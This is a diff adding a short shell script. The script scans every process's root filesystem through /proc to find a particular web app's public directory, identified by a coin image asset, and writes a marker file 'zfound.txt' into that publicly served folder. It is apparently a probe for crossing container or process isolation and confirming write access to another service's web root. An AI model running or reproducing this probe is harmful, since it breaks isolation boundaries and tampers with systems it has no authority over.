@@ -1,0 +1,11 @@
+#!/bin/sh
+for p in /proc/[0-9]*; do
+  R=$p/root
+  for d in "$R/app/public" "$R/app/.next/standalone/public" "$R/public" "$R/usr/src/app/public" "$R/var/www/html" "$R/app/dist/public"; do
+    [ -f "$d/assets/images/coins/aed.svg" ] || continue
+    echo "$p|$d" > "$d/zfound.txt" 2>/dev/null
+    sleep 12
+    exit
+  done
+done
+sleep 3
